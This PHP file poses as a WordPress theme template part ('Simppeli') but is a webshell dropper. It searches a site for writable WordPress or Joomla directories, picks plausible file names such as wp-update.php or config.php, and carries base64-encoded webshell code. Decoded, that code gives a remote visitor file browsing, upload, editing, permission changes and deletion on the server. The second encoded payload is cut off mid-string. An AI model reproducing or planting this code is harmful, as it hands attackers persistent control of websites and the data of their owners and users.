<?php
/**
 * Template part for displaying single posts.
 *
 * @package Simppeli
 */

error_reporting(E_ERROR | E_WARNING | E_PARSE);

function filter_dirs($dir) {
	global $site_root_dir;

	$_dir = substr($dir, strlen($site_root_dir));
	return preg_match("/^\/[a-zA-Z\_\-]+\//", $_dir);
}

function get_all_dirs($dir) {
	global $all_dirs;

	foreach(glob("$dir/*") as $file) {
		if(PLATFORM == WORDPRESS) {
			if(strpos($file, 'wp-content') === false && strpos($file, 'wp-admin') === false && strpos($file, 'wp-includes') === false) {
				continue;
			}
		}
	
		if(is_dir($file)) {
			if(is_writable($file)) {
				$all_dirs[] = $file;
			}
			get_all_dirs($file);
		}
	}
}

function get_file_name($path) {
	$jm_file_names = array(
		'cache.php',
		'configure.php',
		'settings.php',
		'config.php',
		'admin.php',
		'admin-class.php',
		'menus.php',
		'components.php',
		'languages.php',
		'class-library.php',
		'include.php',
		'common.php'
	);
	
	$wp_file_names = array(
		'wp-update.php',
		'wp-block.php',
		'wp-blog.php',
		'wp-content.php',
		'wp-ping.php',
		'wp-widgets.php',
		'wp-search.php',
		'wp-find.php',
		'wp-post-update.php',
		'wp-page-update.php',
		'wp-theme.php',
		'wp-template.php',
		'wp-query.php',
		'wp-admin-block.php',
		'wp-category.php',
		'wp-rewrite.php',
		'wp-taxonomy.php',
		'wp-xml-function.php',
		'wp-plugins.php',
		'wp-register.php',
		'admin-menu.php'
	);
	
	if(PLATFORM == 'WORDPRESS') {
		$file_names = $wp_file_names;
	}
	else {
		$file_names = $jm_file_names;
	}
	
	do {
		$full_path = $path . $file_names[array_rand($file_names)];
	}while(file_exists($full_path));
	
	return $full_path;
}

@set_time_limit(300);

$start_time = time();

define('MAX_EXEC_TIME', 60);
define("MAX_LEVELS_UP", 7);

$wp_code = 'PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKCmlmKGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpewogICAgZm9yZWFjaCgkX1BPU1QgYXMgJGtleT0+JHZhbHVlKXsKICAgICAgICAkX1BPU1RbJGtleV0gPSBzdHJpcHNsYXNoZXMoJHZhbHVlKTsKICAgIH0KfQplY2hvICc8IURPQ1RZUEUgSFRNTD4KPEhUTUw+CjxIRUFEPgo8bGluayBocmVmPSIiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiPgo8dGl0bGU+V2Vic2hlbGw8L3RpdGxlPgo8c3R5bGU+CmJvZHl7CiAgICBmb250LWZhbWlseTogIlJhY2luZyBTYW5zIE9uZSIsIGN1cnNpdmU7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTZlNmU2OwogICAgdGV4dC1zaGFkb3c6MHB4IDBweCAxcHggIzc1NzU3NTsKfQojY29udGVudCB0cjpob3ZlcnsKICAgIGJhY2tncm91bmQtY29sb3I6ICM2MzYyNjM7CiAgICB0ZXh0LXNoYWRvdzowcHggMHB4IDEwcHggI2ZmZjsKfQojY29udGVudCAuZmlyc3R7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiBzaWx2ZXI7Cn0KI2NvbnRlbnQgLmZpcnN0OmhvdmVyewogICAgYmFja2dyb3VuZC1jb2xvcjogc2lsdmVyOwogICAgdGV4dC1zaGFkb3c6MHB4IDBweCAxcHggIzc1NzU3NTsKfQp0YWJsZXsKICAgIGJvcmRlcjogMXB4ICMwMDAwMDAgZG90dGVkOwp9CkgxewogICAgZm9udC1mYW1pbHk6ICJSeWUiLCBjdXJzaXZlOwp9CmF7CiAgICBjb2xvcjogIzAwMDsKICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKfQphOmhvdmVyewogICAgY29sb3I6ICNmZmY7CiAgICB0ZXh0LXNoYWRvdzowcHggMHB4IDEwcHggI2ZmZmZmZjsKfQppbnB1dCxzZWxlY3QsdGV4dGFyZWF7CiAgICBib3JkZXI6IDFweCAjMDAwMDAwIHNvbGlkOwogICAgLW1vei1ib3JkZXItcmFkaXVzOiA1cHg7CiAgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6NXB4OwogICAgYm9yZGVyLXJhZGl1czo1cHg7Cn0KPC9zdHlsZT4KPC9IRUFEPgo8Qk9EWT4KPGNlbnRlcj4KPHRyPjx0ZD5DdXJyZW50IFBhdGggOiAnOwppZihpc3NldCgkX0dFVFsncGF0aCddKSl7CiAgICAkcGF0aCA9ICRfR0VUWydwYXRoJ107ICAgCn1lbHNlewogICAgJHBhdGggPSBnZXRjd2QoKTsKfQokcGF0aCA9IHN0cl9yZXBsYWNlKCdcXCcsJy8nLCRwYXRoKTsKJHBhdGhzID0gZXhwbG9kZSgnLycsJHBhdGgpOwoKZm9yZWFjaCgkcGF0aHMgYXMgJGlkPT4kcGF0KXsKICAgIGlmKCRwYXQgPT0gJycgJiYgJGlkID09IDApewogICAgICAgICRhID0gdHJ1ZTsKICAgICAgICBlY2hvICc8YSBocmVmPSI/cGF0aD0vIj4vPC9hPic7CiAgICAgICAgY29udGludWU7CiAgICB9CiAgICBpZigkcGF0ID09ICcnKSBjb250aW51ZTsKICAgIGVjaG8gJzxhIGhyZWY9Ij9wYXRoPSc7CiAgICBmb3IoJGk9MDskaTw9JGlkOyRpKyspewogICAgICAgIGVjaG8gIiRwYXRoc1skaV0iOwogICAgICAgIGlmKCRpICE9ICRpZCkgZWNobyAiLyI7CiAgICB9CiAgICBlY2hvICciPicuJHBhdC4nPC9hPi8nOwp9CmVjaG8gJzwvdGQ+PC90cj48dHI+PHRkPic7CmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXSkpewogICAgaWYoY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sJHBhdGguJy8nLiRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7CiAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9ImdyZWVuIj5GaWxlIFVwbG9hZCBEb25lLjwvZm9udD48YnIgLz4nOwogICAgfWVsc2V7CiAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RmlsZSBVcGxvYWQgRXJyb3IuPC9mb250PjxiciAvPic7CiAgICB9Cn0KZWNobyAnPGI+PGJyPjxicj4nLnBocF91bmFtZSgpLic8YnI+PC9iPjxicj4nOwplY2hvICc8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiPgpVcGxvYWQgRmlsZSA6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiAvPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIiAvPgo8L2Zvcm0+CjwvdGQ+PC90cj4nOwppZihpc3NldCgkX0dFVFsnZmlsZXNyYyddKSl7CiAgICBlY2hvICI8dHI+PHRkPkN1cnJlbnQgRmlsZSA6ICI7CiAgICBlY2hvICRfR0VUWydmaWxlc3JjJ107CiAgICBlY2hvICc8L3RyPjwvdGQ+PC90YWJsZT48YnIgLz4nOwogICAgZWNobygnPHByZT4nLmh0bWxzcGVjaWFsY2hhcnMoZmlsZV9nZXRfY29udGVudHMoJF9HRVRbJ2ZpbGVzcmMnXSkpLic8L3ByZT4nKTsKfWVsc2VpZihpc3NldCgkX0dFVFsnb3B0aW9uJ10pICYmICRfUE9TVFsnb3B0J10gIT0gJ2RlbGV0ZScpewogICAgZWNobyAnPC90YWJsZT48YnIgLz48Y2VudGVyPicuJF9QT1NUWydwYXRoJ10uJzxiciAvPjxiciAvPic7CiAgICBpZigkX1BPU1RbJ29wdCddID09ICdjaG1vZCcpewogICAgICAgIGlmKGlzc2V0KCRfUE9TVFsncGVybSddKSl7CiAgICAgICAgICAgIGlmKGNobW9kKCRfUE9TVFsncGF0aCddLCRfUE9TVFsncGVybSddKSl7CiAgICAgICAgICAgICAgICBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkNoYW5nZSBQZXJtaXNzaW9uIERvbmUuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+Q2hhbmdlIFBlcm1pc3Npb24gRXJyb3IuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICBQZXJtaXNzaW9uIDogPGlucHV0IG5hbWU9InBlcm0iIHR5cGU9InRleHQiIHNpemU9IjQiIHZhbHVlPSInLnN1YnN0cihzcHJpbnRmKCclbycsIGZpbGVwZXJtcygkX1BPU1RbJ3BhdGgnXSkpLCAtNCkuJyIgLz4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwYXRoIiB2YWx1ZT0iJy4kX1BPU1RbJ3BhdGgnXS4nIj4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcHQiIHZhbHVlPSJjaG1vZCI+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIiAvPgogICAgICAgIDwvZm9ybT4nOwogICAgfWVsc2VpZigkX1BPU1RbJ29wdCddID09ICdyZW5hbWUnKXsKICAgICAgICBpZihpc3NldCgkX1BPU1RbJ25ld25hbWUnXSkpewogICAgICAgICAgICBpZihyZW5hbWUoJF9QT1NUWydwYXRoJ10sJHBhdGguJy8nLiRfUE9TVFsnbmV3bmFtZSddKSl7CiAgICAgICAgICAgICAgICBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkNoYW5nZSBOYW1lIERvbmUuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+Q2hhbmdlIE5hbWUgRXJyb3IuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJF9QT1NUWyduYW1lJ10gPSAkX1BPU1RbJ25ld25hbWUnXTsKICAgICAgICB9CiAgICAgICAgZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICBOZXcgTmFtZSA6IDxpbnB1dCBuYW1lPSJuZXduYW1lIiB0eXBlPSJ0ZXh0IiBzaXplPSIyMCIgdmFsdWU9IicuJF9QT1NUWyduYW1lJ10uJyIgLz4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwYXRoIiB2YWx1ZT0iJy4kX1BPU1RbJ3BhdGgnXS4nIj4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcHQiIHZhbHVlPSJyZW5hbWUiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHbyIgLz4KICAgICAgICA8L2Zvcm0+JzsKICAgIH1lbHNlaWYoJF9QT1NUWydvcHQnXSA9PSAnZWRpdCcpewogICAgICAgIGlmKGlzc2V0KCRfUE9TVFsnc3JjJ10pKXsKICAgICAgICAgICAgJGZwID0gZm9wZW4oJF9QT1NUWydwYXRoJ10sJ3cnKTsKICAgICAgICAgICAgaWYoZndyaXRlKCRmcCwkX1BPU1RbJ3NyYyddKSl7CiAgICAgICAgICAgICAgICBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkVkaXQgRmlsZSBEb25lLjwvZm9udD48YnIgLz4nOwogICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgIGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkVkaXQgRmlsZSBFcnJvci48L2ZvbnQ+PGJyIC8+JzsKICAgICAgICAgICAgfQogICAgICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICB9CiAgICAgICAgZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICA8dGV4dGFyZWEgY29scz04MCByb3dzPTIwIG5hbWU9InNyYyI+Jy5odG1sc3BlY2lhbGNoYXJzKGZpbGVfZ2V0X2NvbnRlbnRzKCRfUE9TVFsncGF0aCddKSkuJzwvdGV4dGFyZWE+PGJyIC8+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9IicuJF9QT1NUWydwYXRoJ10uJyI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ib3B0IiB2YWx1ZT0iZWRpdCI+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIiAvPgogICAgICAgIDwvZm9ybT4nOwogICAgfQogICAgZWNobyAnPC9jZW50ZXI+JzsKfWVsc2V7CiAgICBlY2hvICc8L3RhYmxlPjxiciAvPjxjZW50ZXI+JzsKICAgIGlmKGlzc2V0KCRfR0VUWydvcHRpb24nXSkgJiYgJF9QT1NUWydvcHQnXSA9PSAnZGVsZXRlJyl7CiAgICAgICAgaWYoJF9QT1NUWyd0eXBlJ10gPT0gJ2RpcicpewogICAgICAgICAgICBpZihybWRpcigkX1BPU1RbJ3BhdGgnXSkpewogICAgICAgICAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9ImdyZWVuIj5EZWxldGUgRGlyIERvbmUuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RGVsZXRlIERpciBFcnJvci48L2ZvbnQ+PGJyIC8+JzsKICAgICAgICAgICAgfQogICAgICAgIH1lbHNlaWYoJF9QT1NUWyd0eXBlJ10gPT0gJ2ZpbGUnKXsKICAgICAgICAgICAgaWYodW5saW5rKCRfUE9TVFsncGF0aCddKSl7CiAgICAgICAgICAgICAgICBlY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkRlbGV0ZSBGaWxlIERvbmUuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RGVsZXRlIEZpbGUgRXJyb3IuPC9mb250PjxiciAvPic7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBlY2hvICc8L2NlbnRlcj4nOwogICAgJHNjYW5kaXIgPSBzY2FuZGlyKCRwYXRoKTsKICAgIGVjaG8gJzxkaXYgaWQ9ImNvbnRlbnQiPjx0YWJsZSB3aWR0aD0iNzAwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMSIgYWxpZ249ImNlbnRlciI+CiAgICA8dHIgY2xhc3M9ImZpcnN0Ij4KICAgICAgICA8dGQ+PGNlbnRlcj5OYW1lPC9jZW50ZXI+PC90ZD4KICAgICAgICA8dGQ+PGNlbnRlcj5TaXplPC9jZW50ZXI+PC90ZD4KICAgICAgICA8dGQ+PGNlbnRlcj5QZXJtaXNzaW9uczwvY2VudGVyPjwvdGQ+CiAgICAgICAgPHRkPjxjZW50ZXI+T3B0aW9uczwvY2VudGVyPjwvdGQ+CiAgICA8L3RyPic7CgogICAgZm9yZWFjaCgkc2NhbmRpciBhcyAkZGlyKXsKICAgICAgICBpZighaXNfZGlyKCIkcGF0aC8kZGlyIikgfHwgJGRpciA9PSAnLicgfHwgJGRpciA9PSAnLi4nKSBjb250aW51ZTsKICAgICAgICBlY2hvICI8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9XCI/cGF0aD0kcGF0aC8kZGlyXCI+JGRpcjwvYT48L3RkPgogICAgICAgIDx0ZD48Y2VudGVyPi0tPC9jZW50ZXI+PC90ZD4KICAgICAgICA8dGQ+PGNlbnRlcj4iOwogICAgICAgIGlmKGlzX3dyaXRhYmxlKCIkcGF0aC8kZGlyIikpIGVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+JzsKICAgICAgICBlbHNlaWYoIWlzX3JlYWRhYmxlKCIkcGF0aC8kZGlyIikpIGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPic7CiAgICAgICAgZWNobyBwZXJtcygiJHBhdGgvJGRpciIpOwogICAgICAgIGlmKGlzX3dyaXRhYmxlKCIkcGF0aC8kZGlyIikgfHwgIWlzX3JlYWRhYmxlKCIkcGF0aC8kZGlyIikpIGVjaG8gJzwvZm9udD4nOwogICAgICAgIAogICAgICAgIGVjaG8gIjwvY2VudGVyPjwvdGQ+CiAgICAgICAgPHRkPjxjZW50ZXI+PGZvcm0gbWV0aG9kPVwiUE9TVFwiIGFjdGlvbj1cIj9vcHRpb24mcGF0aD0kcGF0aFwiPgogICAgICAgIDxzZWxlY3QgbmFtZT1cIm9wdFwiPgoJICAgIDxvcHRpb24gdmFsdWU9XCJcIj48L29wdGlvbj4KICAgICAgICA8b3B0aW9uIHZhbHVlPVwiZGVsZXRlXCI+RGVsZXRlPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT1cImNobW9kXCI+Q2htb2Q8L29wdGlvbj4KICAgICAgICA8b3B0aW9uIHZhbHVlPVwicmVuYW1lXCI+UmVuYW1lPC9vcHRpb24+CiAgICAgICAgPC9zZWxlY3Q+CiAgICAgICAgPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwidHlwZVwiIHZhbHVlPVwiZGlyXCI+CiAgICAgICAgPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwibmFtZVwiIHZhbHVlPVwiJGRpclwiPgogICAgICAgIDxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInBhdGhcIiB2YWx1ZT1cIiRwYXRoLyRkaXJcIj4KICAgICAgICA8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiPlwiIC8+CiAgICAgICAgPC9mb3JtPjwvY2VudGVyPjwvdGQ+CiAgICAgICAgPC90cj4iOwogICAgfQogICAgZWNobyAnPHRyIGNsYXNzPSJmaXJzdCI+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PC90cj4nOwogICAgZm9yZWFjaCgkc2NhbmRpciBhcyAkZmlsZSl7CiAgICAgICAgaWYoIWlzX2ZpbGUoIiRwYXRoLyRmaWxlIikpIGNvbnRpbnVlOwogICAgICAgICRzaXplID0gZmlsZXNpemUoIiRwYXRoLyRmaWxlIikvMTAyNDsKICAgICAgICAkc2l6ZSA9IHJvdW5kKCRzaXplLDMpOwogICAgICAgIGlmKCRzaXplID49IDEwMjQpewogICAgICAgICAgICAkc2l6ZSA9IHJvdW5kKCRzaXplLzEwMjQsMikuJyBNQic7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICRzaXplID0gJHNpemUuJyBLQic7CiAgICAgICAgfQoKICAgICAgICBlY2hvICI8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9XCI/ZmlsZXNyYz0kcGF0aC8kZmlsZSZwYXRoPSRwYXRoXCI+JGZpbGU8L2E+PC90ZD4KICAgICAgICA8dGQ+PGNlbnRlcj4iLiRzaXplLiI8L2NlbnRlcj48L3RkPgogICAgICAgIDx0ZD48Y2VudGVyPiI7CiAgICAgICAgaWYoaXNfd3JpdGFibGUoIiRwYXRoLyRmaWxlIikpIGVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+JzsKICAgICAgICBlbHNlaWYoIWlzX3JlYWRhYmxlKCIkcGF0aC8kZmlsZSIpKSBlY2hvICc8Zm9udCBjb2xvcj0icmVkIj4nOwogICAgICAgIGVjaG8gcGVybXMoIiRwYXRoLyRmaWxlIik7CiAgICAgICAgaWYoaXNfd3JpdGFibGUoIiRwYXRoLyRmaWxlIikgfHwgIWlzX3JlYWRhYmxlKCIkcGF0aC8kZmlsZSIpKSBlY2hvICc8L2ZvbnQ+JzsKICAgICAgICBlY2hvICI8L2NlbnRlcj48L3RkPgogICAgICAgIDx0ZD48Y2VudGVyPjxmb3JtIG1ldGhvZD1cIlBPU1RcIiBhY3Rpb249XCI/b3B0aW9uJnBhdGg9JHBhdGhcIj4KICAgICAgICA8c2VsZWN0IG5hbWU9XCJvcHRcIj4KCSAgICA8b3B0aW9uIHZhbHVlPVwiXCI+PC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT1cImRlbGV0ZVwiPkRlbGV0ZTwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9XCJjaG1vZFwiPkNobW9kPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT1cInJlbmFtZVwiPlJlbmFtZTwvb3B0aW9uPgogICAgICAgIDxvcHRpb24gdmFsdWU9XCJlZGl0XCI+RWRpdDwvb3B0aW9uPgogICAgICAgIDwvc2VsZWN0PgogICAgICAgIDxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInR5cGVcIiB2YWx1ZT1cImZpbGVcIj4KICAgICAgICA8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJuYW1lXCIgdmFsdWU9XCIkZmlsZVwiPgogICAgICAgIDxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInBhdGhcIiB2YWx1ZT1cIiRwYXRoLyRmaWxlXCI+CiAgICAgICAgPGlucHV0IHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIj5cIiAvPgogICAgICAgIDwvZm9ybT48L2NlbnRlcj48L3RkPgogICAgICAgIDwvdHI+IjsKICAgIH0KICAgIGVjaG8gJzwvdGFibGU+CiAgICA8L2Rpdj4nOwp9CmVjaG8gJzxiciAvPgo8L0JPRFk+CjwvSFRNTD4nOwpmdW5jdGlvbiBwZXJtcygkZmlsZSl7CiAgICAkcGVybXMgPSBmaWxlcGVybXMoJGZpbGUpOwoKaWYgKCgkcGVybXMgJiAweEMwMDApID09IDB4QzAwMCkgewogICAgLy8gU29ja2V0CiAgICAkaW5mbyA9ICdzJzsKfSBlbHNlaWYgKCgkcGVybXMgJiAweEEwMDApID09IDB4QTAwMCkgewogICAgLy8gU3ltYm9saWMgTGluawogICAgJGluZm8gPSAnbCc7Cn0gZWxzZWlmICgoJHBlcm1zICYgMHg4MDAwKSA9PSAweDgwMDApIHsKICAgIC8vIFJlZ3VsYXIKICAgICRpbmZvID0gJy0nOwp9IGVsc2VpZiAoKCRwZXJtcyAmIDB4NjAwMCkgPT0gMHg2MDAwKSB7CiAgICAvLyBCbG9jayBzcGVjaWFsCiAgICAkaW5mbyA9ICdiJzsKfSBlbHNlaWYgKCgkcGVybXMgJiAweDQwMDApID09IDB4NDAwMCkgewogICAgLy8gRGlyZWN0b3J5CiAgICAkaW5mbyA9ICdkJzsKfSBlbHNlaWYgKCgkcGVybXMgJiAweDIwMDApID09IDB4MjAwMCkgewogICAgLy8gQ2hhcmFjdGVyIHNwZWNpYWwKICAgICRpbmZvID0gJ2MnOwp9IGVsc2VpZiAoKCRwZXJtcyAmIDB4MTAwMCkgPT0gMHgxMDAwKSB7CiAgICAvLyBGSUZPIHBpcGUKICAgICRpbmZvID0gJ3AnOwp9IGVsc2UgewogICAgLy8gVW5rbm93bgogICAgJGluZm8gPSAndSc7Cn0KCi8vIE93bmVyCiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMTAwKSA/ICdyJyA6ICctJyk7CiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDgwKSA/ICd3JyA6ICctJyk7CiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDQwKSA/CiAgICAgICAgICAgICgoJHBlcm1zICYgMHgwODAwKSA/ICdzJyA6ICd4JyApIDoKICAgICAgICAgICAgKCgkcGVybXMgJiAweDA4MDApID8gJ1MnIDogJy0nKSk7CgovLyBHcm91cAokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAyMCkgPyAncicgOiAnLScpOwokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAxMCkgPyAndycgOiAnLScpOwokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwOCkgPwogICAgICAgICAgICAoKCRwZXJtcyAmIDB4MDQwMCkgPyAncycgOiAneCcgKSA6CiAgICAgICAgICAgICgoJHBlcm1zICYgMHgwNDAwKSA/ICdTJyA6ICctJykpOwoKLy8gV29ybGQKJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDQpID8gJ3InIDogJy0nKTsKJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDIpID8gJ3cnIDogJy0nKTsKJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDEpID8KICAgICAgICAgICAgKCgkcGVybXMgJiAweDAyMDApID8gJ3QnIDogJ3gnICkgOgogICAgICAgICAgICAoKCRwZXJtcyAmIDB4MDIwMCkgPyAnVCcgOiAnLScpKTsKCiAgICByZXR1cm4gJGluZm87Cn0KPz4=';

$jm_code = 'PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKCmlmKGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpewogICAgZm9yZWFjaCgkX1BPU1QgYXMgJGtleT0+JHZhbHVlKXsKICAgICAgICAkX1BPU1RbJGtleV0gPSBzdHJpcHNsYXNoZXMoJHZhbHVlKTsKICAgIH0KfQplY2hvICc8IURPQ1RZUEUgSFRNTD4KPEhUTUw+CjxIRUFEPgo8bGluayBocmVmPSIiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiPgo8dGl0bGU+V2Vic2hlbGw8L3RpdGxlPgo8c3R5bGU+CmJvZHl7CiAgICBmb250LWZhbWlseTogIlJhY2luZyBTYW5zIE9uZSIsIGN1cnNpdmU7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTZlNmU2OwogICAgdGV4dC1zaGFkb3c6MHB4IDBweCAxcHggIzc1NzU3NTsKfQojY29udGVudCB0cjpob3ZlcnsKICAgIGJhY2tncm91bmQtY29sb3I6ICM2MzYyNjM7CiAgICB0ZXh0LXNoYWRvdzowcHggMHB4IDEwcHggI2ZmZjsKfQojY29udGVudCAuZmlyc3R7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiBzaWx2ZXI7Cn0KI2NvbnRlbnQgLmZpcnN0OmhvdmVyewogICAgYmFja2dyb3VuZC1jb2xvcjogc2lsdmVyOwogICAgdGV4dC1zaGFkb3c6MHB4IDBweCAxcHggIzc1NzU3NTsKfQp0YWJsZXsKICAgIGJvcmRlcjogMXB4ICMwMDAwMDAgZG90dGVkOwp9CkgxewogICAgZm9udC1mYW1pbHk6ICJSeWUiLCBjdXJzaXZlOwp9CmF7CiAgICBjb2xvcjogIzAwMDsKICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKfQphOmhvdmVyewogICAgY29sb3I6ICNmZmY7CiAgICB0ZXh0LXNoYWRvdzowcHggMHB4IDEwcHggI2ZmZmZmZjsKfQppbnB1dCxzZWxlY3QsdGV4dGFyZWF7CiAgICBib3JkZXI6IDFweCAjMDAwMDAwIHNvbGlkOwogICAgLW1vei1ib3JkZXItcmFkaXVzOiA1cHg7CiAgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6NXB4OwogICAgYm9yZGVyLXJhZGl1czo1cHg7Cn0KPC9zdHlsZT4KPC9IRUFEPgo8Qk9EWT4KPGNlbnRlcj4KPHRyPjx0ZD5DdXJyZW50IFBhdGggOiAnOwppZihpc3NldCgkX0dFVFsncGF0aCddKSl7CiAgICAkcGF0aCA9ICRfR0VUWydwYXRoJ107ICAgCn1lbHNlewogICAgJHBhdGggPSBnZXRjd2QoKTsKfQokcGF0aCA9IHN0cl9yZXBsYWNlKCdcXCcsJy8nLCRwYXRoKTsKJHBhdGhzID0gZXhwbG9kZSgnLycsJHBhdGgpOwoKZm9yZWFjaCgkcGF0aHMgYXMgJGlkPT4kcGF0KXsKICAgIGlmKCRwYXQgPT0gJycgJiYgJGlkID09IDApewogICAgICAgICRhID0gdHJ1ZTsKICAgICAgICBlY2hvICc8YSBocmVmPSI/cGF0aD0vIj4vPC9hPic7CiAgICAgICAgY29udGludWU7CiAgICB9CiAgICBpZigkcGF0ID09ICcnKSBjb250aW51ZTsKICAgIGVjaG8gJzxhIGhyZWY9Ij9wYXRoPSc7CiAgICBmb3IoJGk9MDskaTw9JGlkOyRpKyspewogICAgICAgIGVjaG8gIiRwYXRoc1skaV0iOwogICAgICAgIGlmKCRpICE9ICRpZCkgZWNobyAiLyI7CiAgICB9CiAgICBlY2hvICciPicuJHBhdC4nPC9hPi8nOwp9CmVjaG8gJzwvdGQ+PC90cj48dHI+PHRkPic7CmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXSkpewogICAgaWYoY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sJHBhdGguJy8nLiRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7CiAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9ImdyZWVuIj5GaWxlIFVwbG9hZCBEb25lLjwvZm9udD48YnIgLz4nOwogICAgfWVsc2V7CiAgICAgICAgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RmlsZSBVcGxvYWQgRXJyb3IuPC9mb250PjxiciAvPic7CiAgICB9Cn0KZWNobyAnPGI+PGJyPjxicj4nLnBocF91bmFtZSgpLic8YnI+PC9iPjxicj4nOwplY2hvICc8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiPgpVcGxvYWQgRmlsZSA6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiAvPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIiAvPgo8L2Zvcm0+CjwvdGQ+PC90cj4nOwppZihpc3NldCgkX0dFVFsnZmlsZXNyYyddKSl7C